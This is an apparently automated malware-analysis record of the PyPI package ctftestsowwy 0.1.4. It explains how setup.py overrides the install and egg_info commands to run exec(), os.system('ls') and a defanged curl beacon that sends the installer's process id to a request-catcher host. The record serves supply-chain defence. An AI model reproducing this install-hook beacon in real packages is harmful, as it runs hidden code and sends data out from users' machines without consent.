# pypi ctftestsowwy@0.1.4

**Source:** datadog · **Source label:** malicious · **Released:** 2025-05-10 (dataset) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The sdist's setup.py overrides the setuptools `install` and `egg_info` commands, and both overrides call `RunCommand()` before the normal command, so the code runs on any pip install from source. `RunCommand()` runs `exec()` on a literal string that calls `os.system('ls')` inside a bare `except: pass`, then shells out to `curl hxxp://4l0kemzf[.]requestrepo[.]com/?<pid>`, sending the installer's process id to a request-catcher host. There are no gates: nothing checks the OS, environment, files or anything else before the payload runs. The only things it needs are `curl` on PATH and outbound HTTP to that host.

## Execution

- **cmdclass** `cmdclass[install] = RunInstallCommand`: runs setup.py; direct_script, inline_eval, inline_shell; errors hidden.
- **cmdclass** `cmdclass[egg_info] = RunEggInfoCommand`: runs setup.py; direct_script, inline_eval, inline_shell; errors hidden.
- **setup_py** `python setup.py (pip install from sdist)`: runs setup.py; direct_script.

## Gates

None.

## Requirements

- installed_tool: curl (the beacon is sent by shelling out to curl)
- network: 4l0kemzf[.]requestrepo[.]com:80 (curl beacon to a request-catcher host over plain http)

## Behaviour

- Ungated: spawn_process, exfil
- Gated: none

## Notes

- Looks like a test install callback: the only data sent is the PID, and the `ls` output goes only to the build log. Still an unsolicited beacon at install, so recorded as malicious.
- The `exec()` string is plain text, not encoded.
- `os.system` discards the curl exit status, so a failed beacon does not break the install.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "pypi",
    "name": "ctftestsowwy",
    "version": "0.1.4",
    "archive_sha256": "cb3b5bee54585fd9955f6c8c5acf88ff7627de2bf8ef68006ad4f1900321abf4",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-05-10",
    "released_at_source": "dataset",
    "sample_path": "datadog/pypi/malicious_intent/2025-05-10-ctftestsowwy-v0.1.4.zip",
    "package_root": "layer0/tmp/tmpff8y7b6r/ctftestsowwy/ctftestsowwy-0.1.4",
    "cluster_key": "5908b667c116ced4ca483dc1307127de61e413c76608c5372b6806bced9b6a20",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "cmdclass",
        "command": "cmdclass[install] = RunInstallCommand",
        "runs_on": "always",
        "file_chain": [
          "setup.py"
        ],
        "interpreter": "python",
        "launch_style": [
          "direct_script",
          "inline_eval",
          "inline_shell"
        ],
        "silent_failure": true
      },
      {
        "hook": "cmdclass",
        "command": "cmdclass[egg_info] = RunEggInfoCommand",
        "runs_on": "always",
        "file_chain": [
          "setup.py"
        ],
        "interpreter": "python",
        "launch_style": [
          "direct_script",
          "inline_eval",
          "inline_shell"
        ],
        "silent_failure": true
      },
      {
        "hook": "setup_py",
        "command": "python setup.py (pip install from sdist)",
        "runs_on": "always",
        "file_chain": [
          "setup.py"
        ],
        "interpreter": "python",
        "launch_style": [
          "direct_script"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "setup.py (34 lines) read in full; it is the only install-reached file. Its top-level code only calls setup(); the payload is RunCommand(), called first in both the install and egg_info overrides.",
      "RunCommand runs exec() on a literal string that calls os.system('ls') (bare except around it), then os.system('curl hxxp://4l0kemzf[.]requestrepo[.]com/?<pid>'). No branch on the environment anywhere."
    ]
  },
  "requirements": [
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "the beacon is sent by shelling out to curl"
    },
    {
      "axis": "network",
      "value": "4l0kemzf[.]requestrepo[.]com:80",
      "reason": "curl beacon to a request-catcher host over plain http"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "spawn_process",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [
      "exec() of a plain literal string (no encoding)"
    ],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": false,
    "endpoints": [
      {
        "indicator": "hxxp://4l0kemzf[.]requestrepo[.]com/?",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "malicious_new_package",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "Every pip install of the sdist runs, with no gate, os.system('ls') and a curl beacon carrying the install process id to a requestrepo request-catcher host. It is a low-impact install callback, but it phones home from the victim's machine without consent.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
